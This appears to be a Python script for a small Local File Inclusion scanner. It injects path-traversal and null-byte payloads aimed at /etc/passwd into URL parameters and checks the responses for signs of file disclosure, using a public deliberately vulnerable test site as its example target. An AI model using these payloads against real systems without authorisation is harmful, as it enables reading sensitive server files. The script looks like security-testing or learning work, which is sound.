import urllib.parse
import validators
from urllib.parse import urlparse, parse_qs
import requests


class LFI:
    payloads = ["showimage.php", "../../../../../../../etc/passwd"]
    high_strings = ["root:x:0", "root:x:0", "<?php"]

    def __init__(self, url):
        self.url = url

    def check_url(self):
        return validators.url(self.url)

    """Lets see if url has a query string parameters or not"""

    def contain_params(self):
        if self.check_url():
            parsed_url = urlparse(self.url)
            query = parsed_url.query
            parameters = parse_qs(query)
            if bool(parameters) is False and parameters is not None:
                return False
            else:
                return True
                # return {k:v[0] if v and len(v) == 1 else v for k,v in parameters.items()}

    def mod_query(self):
        null_byte_list = []
        scheme = urlparse(self.url)
        common_ext = ["php", "html", "js", "jpg", "jpeg", "png", "css"]
        query = scheme.query
        # get two parameters at a row
        parameters = parse_qs(query)
        for parameter in parameters:
            endpoints = parameters[parameter]
            for endpoint in endpoints:
                if len(endpoint.split(".")) > 1:
                    extension = endpoint.split(".")[1]
                    if extension in common_ext:
                        for P in LFI.payloads:
                            new_param = P + "%00" + "." + extension
                            null_byte_list.append(new_param)
        return null_byte_list

    def add_null_byte(self,null_Bytes):
        null_vulns = []
        scheme = urlparse(self.url)
        parameters = parse_qs(scheme.query)
        for parameter in parameters:
            for byte in null_Bytes:
                current_val = parameters[parameter]
                parameters[parameter] = byte
                new_parts = list(scheme)
                new_parts[4] = urllib.parse.urlencode(parameters)
                build_query = urllib.parse.urlunparse(new_parts)
                final_url = urllib.parse.unquote(build_query)
                print(final_url)
                request = requests.get(final_url)
                for highString in LFI.high_strings:
                    if highString in request.text:
                        null_vulns.append({byte:parameters[parameter]})
                    else:
                        if type(current_val) == list:
                            parameters[parameter] = current_val[0]
                        else:
                            parameters[parameter] = current_val


    def check_LFI(self, is_param):
        LFI_vulns = []
        if is_param is not False:
            parsed_url = urlparse(self.url)
            parameters = parse_qs(parsed_url.query)
            for parameter in parameters:
                for P in LFI.payloads:
                    current_value = parameters[parameter]
                    parameters[parameter] = P
                    new_parts = list(parsed_url)
                    new_parts[4] = urllib.parse.urlencode(parameters)
                    build_url = urllib.parse.urlunparse(new_parts)
                    data = requests.get(build_url).text

                    for high_string in LFI.high_strings:
                        if high_string in data:
                            #print("[+] LFI Found with the payload {} on {} parameter".format(P, parameter))
                            LFI_vulns.append({P : parameter})

                    parameters[parameter] = current_value
            return LFI_vulns
        else:
            print("Bu dict boş")


if __name__ == '__main__':
    scanner = LFI("http://testphp.vulnweb.com/showimage.php?file=showimage.php&wayback=test")
    checker = scanner.contain_params()
    #print(scanner.check_LFI(checker))
    list_of_something = scanner.mod_query()
    scanner.add_null_byte(list_of_something)
